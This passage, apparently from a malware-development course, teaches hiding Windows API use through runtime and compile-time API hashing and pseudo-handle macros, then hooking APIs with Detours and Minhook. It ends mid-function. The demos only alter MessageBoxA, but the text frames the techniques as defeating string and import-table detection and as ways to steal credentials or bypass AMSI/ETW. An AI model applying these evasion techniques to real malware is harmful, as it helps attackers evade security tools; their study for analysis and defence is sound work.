	if (pMessageBoxA == NULL) {
		printf("[!] Cound'nt Find Address Of Specified Function \n");
		return -1;
	}

	// Calling MessageBoxA
	pMessageBoxA(NULL, "Building Malware With Maldev", "Wow", MB_OK | MB_ICONEXCLAMATION);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}

```

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/api-hashing-110060375-e0d6069b-7538-4b31-add1-92f72003f85c.png)

### Searching For MessageBox String

Using the??[Strings.exe Sysinternal Tool](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)??search for the string "MessageBox".

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/api-hashing-210060409-a932736a-ec54-4946-939f-750f44affa19.png)

It can be observed that there is no corresponding string in our binary.??`MessageBoxA`??was successfully called without being imported into the IAT or exposed as a string in our binary. This is applicable for both 32-bit and 64-bit systems.
# 6.4 IAT Hiding & Obfuscation - Custom Pseudo Handles

### Introduction

As demonstrated earlier, utilizing API hashing to mask an implementation's IAT is an effective method. However, sometimes replacing a WinAPI itself, if feasible, can enhance the concealment of the IAT decreasing the number of hash values, as well as reducing potential heuristic signatures connected to the API hashing algorithm. Furthermore, implementing custom code for a WinAPI function can be used across various implementations, simplifying the automation of the overall IAT hiding process.

With that being said, this module will go through the process of using a debugger to analyze two functions that retrieve pseudo handles and then create custom versions of them. Again, the goal is to avoid having these functions appear in the IAT, without leveraging API hashing. The functions that will be analyzed are:

- [GetCurrentProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess)??- Retrieves a pseudo handle for the calling process.
    
- [GetCurrentThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread)??- Retrieves a pseudo handle for the calling thread.
    

### What is a Pseudo Handle?

A pseudo handle is a type of handle that doesn't correspond to a specific system resource and instead acts as a reference to the current process or thread.

### Analyzing The Functions

As previously mentioned, both of these functions return a pseudo handle for their relative object, whether it's a process or thread. This section will analyze these functions using the xdbg debugger to understand their internal workings.

Begin by searching for the??`GetCurrentProcess`??function in the exporting DLL,??`kernel32.dll`. The function's address is??`0x00007FFD9A4A5040`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/pseudo-handle-124505341-1cca443b-e5d2-4d90-8a75-5f77b08bfe56.png)

Head to this address and notice the??`jmp`??instruction.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/pseudo-handle-224505515-1079792a-5685-4051-a364-6a7424d95646.png)

Follow the jump to reach the function's code. The instruction??`or rax, FFFFFFFFFFFFFFFF`??will set the??`RAX`??register to that value, and the??`ret`??instruction will return??`0xFFFFFFFFFFFFFFFF`. The two's complement representation of??`0xFFFFFFFFFFFFFFFF`??is -1.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/pseudo-handle-324505523-586c63fa-8f52-4564-b01f-a52c3a34524f.png)

The same steps are performed for the??`GetCurrentThread`??function. Similarly, this function returns??`0xFFFFFFFFFFFFFFFE`. The two's complement representation of??`0xFFFFFFFFFFFFFFFE`??is -2.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/pseudo-handle-424505527-99a803e2-eaff-49a3-9ac2-470bc1fb8c69.png)

### Custom Implementation

Since??`GetCurrentProcess`??returns -1 and??`GetCurrentThread`??returns -2, the functions can be replaced with the following macros. Notice that the values are type-casted to??`HANDLE`??types.

```c
#define NtCurrentProcess() ((HANDLE)-1) // Return the pseudo handle for the current process
#define NtCurrentThread()  ((HANDLE)-2) // Return the pseudo handle for the current thread
```

### 32-bit Systems

The 64-bit versions of??`GetCurrentProcess`??and??`GetCurrentThread`??functions differ from their 32-bit version only in the size of the HANDLE data type. The??`HANDLE`??data type on 32-bit systems is 4 bytes. The image below shows??`GetCurrentProcess`??on a 32-bit system.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/pseudo-handle-524524030-94c0a3e8-71c0-4df6-b4b5-e95b2e76edca.png)

### Conclusion

This module introduced the concept of replacing WinAPIs instead of leveraging API hashing to hide an implementation's IAT as well as introducing the pseudo handles concept of local threads and processes. It is worth mentioning that not all WinAPIs functions can be replaced with custom code because most of them are more complex functions than what was shown in this module. For additional WinAPI function replacement, visit the??[VX-API Github repository](https://github.com/vxunderground/VX-API).
# 6.5 IAT Hiding & Obfuscation - Compile Time API Hashing

### Introduction

In the previous API Hashing module, the hashes of the functions and modules were generated before adding them to the code. Unfortunately, that can be highly time-consuming and can be avoided by using??_Compile Time API Hashing_.

Furthermore, in the previous module hashes were hard coded which can allow security solutions to use them as IoC, if they are not updated in each implementation. With compile time API hashing, however, dynamic hashes are generated every time the binary is compiled.

### Caveat

This method only works with C++ projects due to the use of the??[constexpr](https://en.cppreference.com/w/cpp/language/constexpr)??keyword. The??`constexpr`??operator in C++ is used to indicate that a function or variable can be evaluated at compile time. In addition, the??`constexpr`??operator on functions and variables improves the performance of an application by allowing the compiler to perform certain calculations at compile time rather than at runtime.

### Compile Time Hashing Walkthrough

The sections below walk through the steps required to implement compile time hashing.

#### Create Compile Time Functions

The first step is to convert the hashing functions that will be used to become compile time functions using the??`constexpr`??operator. In this case, the Dbj2 hashing algorithm will be modified to use the??`constexpr`??operator.

```c
#define        SEED       5

// Compile time Djb2 hashing function (WIDE)
constexpr DWORD HashStringDjb2W(const wchar_t* String) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		Hash = ((Hash << SEED) + Hash) + c;
	}

	return Hash;
}

// Compile time Djb2 hashing function (ASCII)
constexpr DWORD HashStringDjb2A(const char* String) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		Hash = ((Hash << SEED) + Hash) + c;
	}

	return Hash;
}
```

The undefined variable,??`g_KEY`, is used as the initial hash in both functions.??`g_KEY`??is a global??`constexpr`??variable and is randomly generated by a function named??`RandomCompileTimeSeed`??(explained below), on each compilation of the binary.

#### Generating a Random Seed Value

`RandomCompileTimeSeed`??is used to generate a random seed value based on the current time. It does this by extracting the digits from the??[**TIME**](https://www.cprogramming.com/reference/preprocessor/__TIME__.html#:~:text=__TIME__%20is%20a,moment%20a%20binary%20was%20built.&text=You%20can%20also%20use%20the,to%20get%20the%20current%20date.)??macro, which is a predefined macro in C++ that expands to the current time in the??`HH:MM:SS`??format. Then, the??`RandomCompileTimeSeed`??function multiplies each digit by a different random constant and adds them all together to produce a final seed value.

```c
// Generate a random key at compile time which is used as the initial hash
constexpr int RandomCompileTimeSeed(void)
{
	return '0' * -40271 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
};

// The compile time random seed
constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;
```

#### Creating Macros

Next, define two macros,??`RTIME_HASHA`??and??`RTIME_HASHW`, to be used by the??`GetProcAddressH`??function during runtime to compare hashes. The macros should be defined as follows.

```c
#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)       // Calling HashStringDjb2A
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)    // Calling HashStringDjb2W
```

Once a random compile time hashing function is established, the next step is to declare compile time hash values in variables. To streamline the process, two macros will be implemented.

```c
#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W = HashStringDjb2W((const wchar_t*) L#API);
```

#### Stringizing Operator

The??`#`??symbol is known as the??_stringizing operator_. It is used to convert a preprocessor macro parameter into a string literal.

For example, if the??`CTIME_HASHA`??macro is called with the argument??`SomeFunction`, like??`HASHA(SomeFunction)`, the??`#API`??expression would be replaced with the string literal??`"SomeFunction"`.

#### Merging Operator

The??`##`??operator is known as the??_merging operator_. It is used to combine two preprocessor macros into a single macro. The??`##`??operator is used to combine the API parameter with the string??`"_Rotr32A"`??or??`"_Rotr32W"`, respectively, to form the final name of the variable being defined.

For example, if the??`CTIME_HASHA`??macro is called with the argument??`SomeFunction`, like??`HASHA(SomeFunction)`, the??`##`??operator would combine API with??`"_Rotr32A"`??to form the final variable name??`SomeFunction_Rotr32A`.

### Macro Expansion Demo

To better understand how the previous macros work, the image below shows an example using the??`CTIME_HASHA`??macro to create a hash for??`MessageBoxA`??by creating a variable called??`MessageBoxA_Rotr32A`??that will hold the compile time hash value.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/compile-time-hashing-110127028-dfa23b5b-cc3a-430a-b792-23792ce51c5d.png)

### Compile Time Hashing - Code

After putting all the pieces together, the code will be as shown below.

```c
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>


#define        SEED       5

// generate a random key (used as initial hash)
constexpr int RandomCompileTimeSeed(void)
{
	return '0' * -40271 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;


// Compile time Djb2 hashing function (WIDE)
constexpr DWORD HashStringDjb2W(const wchar_t* String) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		Hash = ((Hash << SEED) + Hash) + c;
	}

	return Hash;
}

// Compile time Djb2 hashing function (ASCII)
constexpr DWORD HashStringDjb2A(const char* String) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		Hash = ((Hash << SEED) + Hash) + c;
	}

	return Hash;
}


// runtime hashing macros 
#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)



// compile time hashing macros (used to create variables)
#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W = HashStringDjb2W((const wchar_t*) L#API);


FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER           pImgDosHdr        = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS           pImgNtHdrs        = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	IMAGE_OPTIONAL_HEADER       ImgOptHdr         = pImgNtHdrs->OptionalHeader;

	PIMAGE_EXPORT_DIRECTORY     pImgExportDir     = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD      FunctionNameArray     = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD      FunctionAddressArray  = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD       FunctionOrdinalArray  = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		CHAR*	pFunctionName       = (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID	pFunctionAddress    = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		if (dwApiNameHash == RTIME_HASHA(pFunctionName)) { // runtime hash value check 
			return (FARPROC)pFunctionAddress;
		}
	}

	return NULL;
}
```

### Demo

This demo calls??`MessageBoxA`??and??`MessageBoxW`??using compile time API hashing using the??`MessageBoxA_Rotr32A`??compile time variable.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/compile-time-hashing-210127200-98154fdf-2810-472c-b3f8-6fa46605955b.png)

#### Check for IoCs

Use the Sysinternal Strings tool to search for the "MessageBox".

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/compile-time-hashing-310127229-b041b0ac-e48e-4c12-88b5-cc39ce6e0d8e.png)

  

Use the Dumpbin tool to check the IAT for anything related to??`MessageBox`.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/compile-time-hashing-410127235-cfc37903-ef42-4ab6-8401-d1a20282a479.png)

#### Running The Binary

Run the binary and see in fact??`MessageBox`??is being used.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/compile-time-hashing-510127264-113b5309-cdbb-4d86-9c74-7e7a0b0c3918.png)

#### Verify Dynamic Hash Value

Print the hash values to the console in order to verify it's being modified every time the code is compiled.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/compile-time-hashing-610127288-887779b6-b023-4a31-8bc7-e76018642b94.png)

  

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/compile-time-hashing-710127301-b4ad2456-74a9-4030-893a-d330d35dc25a.png)

  

Rebuild the Visual Studio Project, check the hash values again and notice that the hash values are different from the previous run.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/compile-time-hashing-810127330-fd9124e2-361c-463b-bc4e-7e5ea2dc65a7.png)
# 6.6 API Hooking - Introduction

### Introduction

API hooking is a technique used to intercept and modify the behavior of an API function. This is commonly used for debugging, reverse engineering and game cheating. API hooking involves replacing the original implementation of an API function with a custom version that performs some additional actions before or after calling the original function. This allows one to modify the behavior of a program without modifying its source code.

### Trampolines

The classical way of implementing API hooking is done via??_trampolines_. A trampoline is a shellcode that is used to alter the code execution path by jumping to another specific address inside the address space of a process. The trampoline's shellcode is inserted at the beginning of the function, resulting in the function becoming hooked. When the hooked function is called, the trampoline shellcode is triggered instead, and the execution flow is passed and altered to another address thus resulting in a different function being executed instead.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/hooking-intro-115247938-09b2e089-3a64-443f-86b1-e147acfe8cdc.png)

### Inline Hooking

Inline hooking is an alternative approach to performing API hooking that operates similarly to trampoline-based hooking. The difference lies in the fact that inline hooks return execution to the legitimate function, allowing for normal execution to continue. While more complex to implement and potentially harder to maintain, inline hooks are more efficient.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/hooking-intro-215247209-ce8c97aa-3d6f-488e-893c-aea9230f6afa.png)

API hooking is performed by security solutions to allow them to inspect commonly abused functions more thoroughly. This will be discussed more in-depth in future modules. This module explores how API hooking can enhance a malware's abilities.

### Why API Hooking

Although API hooking is mostly used for malware analysis and debugging purposes, it can be utilized to be used in malware development for the following reasons:

- Gather sensitive information or data (e.g. credentials).
    
- Modify or intercept function calls for malicious purposes.
    
- Bypass security measures by altering how the operating system or a program behaves (e.g. AMSI, ETW).
    

### Implementing Hooking

There are many ways to implement API hooking, one way is through open-source libraries such as Microsoft's??[Detours](https://github.com/microsoft/Detours)??library and??[Minhook](https://github.com/TsudaKageyu/minhook). Another more limited way is using Windows APIs that are meant to do API hooking (although for limited options).

In the next few modules, both??[Detours](https://github.com/microsoft/Detours)??and??[Minhook](https://github.com/TsudaKageyu/minhook)??will be demonstrated. Furthermore, Windows APIs will be used to see what they can offer. Finally, custom hooking code will be created to reduce signatures and IoCs that are commonly used to detect the usage of open-source libraries.
# 6.7 API Hooking - Detours Library

### Introduction

The??[Detours Hooking Library](https://github.com/microsoft/Detours), is a software library developed by Microsoft Research that allows for intercepting and redirecting function calls in Windows. The library redirect calls of specific functions to a user-defined replacement function that can then perform additional tasks or modify the behavior of the original function. Detours is typically used with C/C++ programs and can be used with both 32-bit and 64-bit applications.

The library's wiki page is available??[here](https://github.com/microsoft/Detours/wiki/).

### Transactions

The Detours library replaces the first few instructions of the target function, that is the function to be hooked, with an unconditional jump to the user-provided detour function, which is the function to be executed instead. The term unconditional jump is also referred to as trampoline.

The library uses??_transactions_??to install and uninstall hooks from a targeted function. Transactions allow hooking routines to group multiple function hooks together and apply them as a single unit, which can be beneficial when making multiple changes to a program's behavior. It also provides the advantage of enabling the user to easily undo all changes if necessary. When using transactions, a new transaction can be started, function hooks added, and then committed. Upon committing the transaction, all function hooks added to the transaction will be applied to the program, as would be the case with unhooking.

### Using The Detours Library

To use the Detours library's functions, the Detours repository must be downloaded and compiled to get the static library files (.lib) files needed for the compilation. In addition to that the??[detours.h](https://github.com/microsoft/Detours/blob/master/src/detours.h)??header file should be included, this is explained in the Detours wiki under the??[Using Detours](https://github.com/microsoft/Detours/wiki/Using-Detours)??section.

For additional help adding .lib files to a project, review??[Microsoft's documentation](https://learn.microsoft.com/en-us/cpp/build/reference/dot-lib-files-as-linker-input?view=msvc-170).

### 32-bit vs 64-bit Detours Library

The shared code in this module has preprocessor code that determines which version of the Detours??`.lib`??file to include, depending on the architecture of the machine being used. To do so, the??`_M_X64`??and??`_M_IX86`??macros are used. These macros are defined by the compiler to indicate whether the machine is running a 64-bit or 32-bit version of Windows. The preprocessor code looks like the following:

```c
// If compiling as 64-bit
#ifdef _M_X64
#pragma comment (lib, "detoursx64.lib")
#endif // _M_X64


// If compiling as 32-bit
#ifdef _M_IX86
#pragma comment (lib, "detoursx86.lib")
#endif // _M_IX86
```

The??`#ifdef _M_X64`??checks if the macro??`_M_X64`??is defined, and if it is, the code following it will be included in the compilation. If it is not defined, the code will be ignored. Similarly,??`#ifdef _M_IX86`??checks if the macro??`_M_IX86`??is defined, and if it is, the code following it will be included in the compilation. The??`#pragma comment (lib, "detoursx64.lib")`??is used to link the??_detoursx64.lib_??library during compilation for 64-bit systems, and??`#pragma comment (lib, "detoursx86.lib")`??is used to link the??_detoursx86.lib_??library during compilation for 32-bit systems.

Both??_detoursx64.lib_??and??_detoursx86.lib_??files are created when compiling the Detours library,??_detoursx64.lib_??is created when compiling the Detours library as a 64-bit project, likewise, the??_detoursx86.lib_??is created when compiling the Detours library as a 32-bit project.

### Detours API Functions

When using any hooking method, the first step is to always retrieve the address of the WinAPI function to hook. The function's address is required to determine where the jump instructions will be placed. In this module, the??`MessageBoxA`??function will be utilized as a function to hook.

Below are the API functions the Detours Library offers:

- [DetourTransactionBegin](https://github.com/microsoft/Detours/wiki/DetourTransactionBegin)??- Begin a new transaction for attaching or detaching detours. This function should be called first when hooking and unhooking.
    
- [DetourUpdateThread](https://github.com/microsoft/Detours/wiki/DetourUpdateThread)??- Update the current transaction. This is used by Detours library to??_Enlist_??a thread in the current transaction.
    
- [DetourAttach](https://github.com/microsoft/Detours/wiki/DetourAttach)??- Install the hook on the target function in a current transaction. This won't be committed until??`DetourTransactionCommit`??is called.
    
- [DetourDetach](https://github.com/microsoft/Detours/wiki/DetourDetach)??- Remove the hook from the targetted function in a current transaction. This won't be committed until??`DetourTransactionCommit`??is called.
    
- [DetourTransactionCommit](https://github.com/microsoft/Detours/wiki/DetourTransactionCommit)??- Commit the current transaction for attaching or detaching detours.
    

The functions above return a??`LONG`??value which is used to understand the result of the function's execution. A Detours API will return??`NO_ERROR`, which is a 0, if it succeeds and a non-zero value upon failure. The non-zero value can be used as an error code for debugging purposes.

### Replacing The Hooked API

The next step is to create a function to replace the hooked API. The replacement function should be of the same data type, and optionally, take the same parameters. This allows for inspection or modification of the parameter values. For example, the following function can be used as a detour function for??`MessageBoxA`??which allows one to check the original parameter values.

```c
INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // we can check hWnd - lpText - lpCaption - uType parametes
}
```

It is worth noting that the replacement function can take fewer parameters, but can't take more than the original function because then it would access an invalid address which will throw access violation exceptions.

### The Infinite Loop Problem

When a hooked function is called and the hook is triggered, the custom function is executed, however, for the execution flow to continue, the custom function must return a valid value that the original hooked function was meant to return. A naive approach would be to return the same value by calling the original function inside of the hook. This can lead to problems as the replacement function will be called instead, resulting in an infinite loop. This is a general hooking issue and not a bug in the Detours library.

In order to gain a better understanding of this, the code snippet below shows the replacement function,??`MyMessageBoxA`??calling??`MessageBoxA`. This results in an infinite loop. The program will get stuck running??`MyMessageBoxA`, that is because??`MyMessageBoxA`??is calling??`MessageBoxA`, and??`MessageBoxA`??leads to the??`MyMessageBoxA`??function again.

```c
INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // Printing original parameters value
  printf("Original lpText Parameter	: %s\n", lpText);
  printf("Original lpCaption Parameter : %s\n", lpCaption);
  
  // DON'T DO THIS
  // Changing the parameters value
  return MessageBoxA(hWnd, "different lpText", "different lpCaption", uType); // Calling MessageBoxA (this is hooked)
}
```

#### Solution 1 - Global Original Function Pointer

The Detours library can resolve this issue by saving a pointer to the original function prior to hooking it. This pointer can be stored in a global variable and invoked instead of the hooked function within the detour function.

```c
// Used as a unhooked MessageBoxA in `MyMessageBoxA`
fnMessageBoxA g_pMessageBoxA = MessageBoxA;

INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // Printing original parameters value
  printf("Original lpText Parameter	: %s\n", lpText);
  printf("Original lpCaption Parameter : %s\n", lpCaption);
  
  // Changing the parameters value
  // Calling an unhooked MessageBoxA
  return g_pMessageBoxA(hWnd, "different lpText", "different lpCaption", uType);
}
```

#### Solution 2 - Using a Different API

Another more general solution worth mentioning is calling a different??_unhooked_??function that has the same functionality as the hooked function. For example??`MessageBoxA`??and??`MessageBoxW`,??`VirtualAlloc`??and??`VirtualAllocEx`.

```c
INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // Printing original parameters value
  printf("Original lpText Parameter	: %s\n", lpText);
  printf("Original lpCaption Parameter : %s\n", lpCaption);
  
  // Changing the parameters value
  return MessageBoxW(hWnd, L"different lpText", L"different lpCaption", uType);
}
```

### Detours Hooking Routine

As previously explained, the Detours library works using transactions therefore to hook an API function, one must create a transaction, submit an action (hooking/unhooking) to the transaction, and then commit the transaction. The code snippet below performs these steps.

```c

// Used as a unhooked MessageBoxA in `MyMessageBoxA`
// And used by `DetourAttach` & `DetourDetach`
fnMessageBoxA g_pMessageBoxA = MessageBoxA;


// The function that will run instead MessageBoxA when hooked
INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {

	printf("[+] Original Parameters : \n");
	printf("\t - lpText	: %s\n", lpText);
	printf("\t - lpCaption	: %s\n", lpCaption);

	return g_pMessageBoxA(hWnd, "different lpText", "different lpCaption", uType);
}


BOOL InstallHook() {
	
	DWORD	dwDetoursErr = NULL;

  	// Creating the transaction & updating it
	if ((dwDetoursErr = DetourTransactionBegin()) != NO_ERROR) {
		printf("[!] DetourTransactionBegin Failed With Error : %d \n", dwDetoursErr);
		return FALSE;
	}
  
	if ((dwDetoursErr = DetourUpdateThread(GetCurrentThread())) != NO_ERROR) {
		printf("[!] DetourUpdateThread Failed With Error : %d \n", dwDetoursErr);
		return FALSE;
	}
  
  	// Running MyMessageBoxA instead of g_pMessageBoxA that is MessageBoxA
	if ((dwDetoursErr = DetourAttach((PVOID)&g_pMessageBoxA, MyMessageBoxA)) != NO_ERROR) {
		printf("[!] DetourAttach Failed With Error : %d \n", dwDetoursErr);
		return FALSE;
	}

  	// Actual hook installing happen after `DetourTransactionCommit` - commiting the transaction
	if ((dwDetoursErr = DetourTransactionCommit()) != NO_ERROR) {
		printf("[!] DetourTransactionCommit Failed With Error : %d \n", dwDetoursErr);
		return FALSE;
	}

	return TRUE;
}
```

### Detours Unhooking Routine

The code snippet below shows the same routine as the previous section except this is for unhooking.

```c

// Used as a unhooked MessageBoxA in `MyMessageBoxA`
// And used by `DetourAttach` & `DetourDetach`
fnMessageBoxA g_pMessageBoxA = MessageBoxA;


// The function that will run instead MessageBoxA when hooked
INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {

	printf("[+] Original Parameters : \n");
	printf("\t - lpText	: %s\n", lpText);
	printf("\t - lpCaption	: %s\n", lpCaption);

	return g_pMessageBoxA(hWnd, "different lpText", "different lpCaption", uType);
}


BOOL Unhook() {

	DWORD	dwDetoursErr = NULL;

  	// Creating the transaction & updating it
	if ((dwDetoursErr = DetourTransactionBegin()) != NO_ERROR) {
		printf("[!] DetourTransactionBegin Failed With Error : %d \n", dwDetoursErr);
		return FALSE;
	}
  
	if ((dwDetoursErr = DetourUpdateThread(GetCurrentThread())) != NO_ERROR) {
		printf("[!] DetourUpdateThread Failed With Error : %d \n", dwDetoursErr);
		return FALSE;
	}
  
  	// Removing the hook from MessageBoxA
	if ((dwDetoursErr = DetourDetach((PVOID)&g_pMessageBoxA, MyMessageBoxA)) != NO_ERROR) {
		printf("[!] DetourDetach Failed With Error : %d \n", dwDetoursErr);
		return FALSE;
	}

  	// Actual hook removal happen after `DetourTransactionCommit` - commiting the transaction
	if ((dwDetoursErr = DetourTransactionCommit()) != NO_ERROR) {
		printf("[!] DetourTransactionCommit Failed With Error : %d \n", dwDetoursErr);
		return FALSE;
	}

	return TRUE;
}

```

### The Main Function

The hooking and unhooking routines previously shown do not include a main function. The main function is shown below which simply invokes the unhooked and hooked versions of??`MessageBoxA`.

```c
int main() {

    // Will run - not hooked
	MessageBoxA(NULL, "What Do You Think About Malware Development ?", "Original MsgBox", MB_OK | MB_ICONQUESTION);


//------------------------------------------------------------------
    //  Hooking
	if (!InstallHook())
	    return -1;

//------------------------------------------------------------------	
    // Won't run - will run MyMessageBoxA instead
	MessageBoxA(NULL, "Malware Development Is Bad", "Original MsgBox", MB_OK | MB_ICONWARNING);


//------------------------------------------------------------------
    //  Unhooking
	if (!Unhook()) 
	    return -1;
		
//------------------------------------------------------------------
    //  Will run - hook removed
	MessageBoxA(NULL, "Normal MsgBox Again", "Original MsgBox", MB_OK | MB_ICONINFORMATION);
  
  	return 0;
}

```

### Demo

Running the first MessageBoxA (Unhooked)

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/detours-113692112-13168cc0-dd84-4b71-9c9a-c639b6bcd3e8.png)

  

Running the second MessageBoxA (Hooked)![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/detours-213692174-164b9d16-059a-4587-a4d2-3e264f3ac539.png)

  

Running the third MessageBoxA (Unhooked)![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/detours-313692221-be94d5d0-34a4-42a9-9545-a4934e5878ef.png)
# 6.8 API Hooking - Minhook Library

### Introduction

[Minhook](https://github.com/TsudaKageyu/minhook)??is a hooking library written in C that can be used to achieve API hooking. It is compatible with both 32-bit and 64-bit applications on Windows and uses x86/x64 assembly for inline hooking, similar to the Detours library. In comparison to other hooking libraries, MinHook is simpler and offers lightweight APIs, making it easier to work with.

### Using The Minhook Library

Similarly to the Detours library, the Minhook library requires the static??`.lib`??file and the??[MinHook.h](https://github.com/TsudaKageyu/minhook/blob/master/include/MinHook.h)??header file to be included in the Visual Studio project.

### Minhook API Functions

The Minhook library works by initializing a structure that holds the required information needed for the hook's installation or removal. This is done via the??`MH_Initialize`??API that initializes the??[HOOK_ENTRY](https://github.com/TsudaKageyu/minhook/blob/master/src/hook.c#L61)??structure in the library. Next, the??`MH_CreateHook`??function is used to create the hooks and??`MH_EnableHook`??is used to enable them.??`MH_DisableHook`??is used to remove the hooks and finally,??`MH_Uninitialize`??is used to clean up the initialized structure. The functions are listed again below for convenience.

- [MH_Initialize](https://github.com/TsudaKageyu/minhook/blob/master/include/MinHook.h#L96)??- Initializes the HOOK_ENTRY structure.
    
- [MH_CreateHook](https://github.com/TsudaKageyu/minhook/blob/master/include/MinHook.h#L111)??- Create the hooks.
    
- [MH_EnableHook](https://github.com/TsudaKageyu/minhook/blob/master/include/MinHook.h#L154)??- Enables the created hooks.
    
- [MH_DisableHook](https://github.com/TsudaKageyu/minhook/blob/master/include/MinHook.h#L161)??- Remove the hooks.
    
- [MH_Uninitialize](https://github.com/TsudaKageyu/minhook/blob/master/include/MinHook.h#L100)??- Cleanup the initialized structure.
    

The Minhook APIs return a??`MH_STATUS`??value which is a user-defined enumeration located in??[Minhook.h](https://github.com/TsudaKageyu/minhook/blob/master/include/MinHook.h#L38). The returned??`MH_STATUS`??data type indicates the error code of a specified function. An??`MH_OK`??value, which is a 0, is returned if the function succeeds and a non-zero value is returned if an error occurs.

It is worth noting that both??`MH_Initialize`??and??`MH_Uninitialize`??functions should be only called once, at the beginning and the end of the program, respectively.

### The Detour Function

This module will utilize the same MessageBoxA API example from the preceding module, which will be hooked and changed to execute a different message box.

```c
fnMessageBoxA g_pMessageBoxA = NULL;

INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {

	printf("[+] Original Parameters : \n");
	printf("\t - lpText	: %s\n", lpText);
	printf("\t - lpCaption	: %s\n", lpCaption);

	return g_pMessageBoxA(hWnd, "Different lpText", "Different lpCaption", uType);
}
```

Notice the??`g_pMessageBoxA`??global variable is used to run the message box, where??`g_pMessageBoxA`??is a pointer to the original, unhooked MessageBoxA API. This is set to??`NULL`??because the Minhook??[MH_CreateHook](https://github.com/TsudaKageyu/minhook/blob/master/include/MinHook.h#L108)??API call is the one that initializes it for use, as opposed to the Detours library where??`g_pMessageBoxA`??was set manually. This is done to prevent the occurrence of a hooking loop issue, which was discussed in the previous module.

### Minhook Hooking Routine

As mentioned earlier, to hook a specific API using Minhook, it is first required to execute the??`MH_Initialize`??function. Hooks can then be created with??`MH_CreateHook`??and enabled with??`MH_EnableHook`.

```c
BOOL InstallHook() {
	
	DWORD 	dwMinHookErr = NULL;

	if ((dwMinHookErr = MH_Initialize()) != MH_OK) {
		printf("[!] MH_Initialize Failed With Error : %d \n", dwMinHookErr);
		return FALSE;
	}
	
	// Installing the hook on MessageBoxA, to run MyMessageBoxA instead
	// g_pMessageBoxA will be a pointer to the original MessageBoxA function
	if ((dwMinHookErr = MH_CreateHook(&MessageBoxA, &MyMessageBoxA, &g_pMessageBoxA)) != MH_OK) {
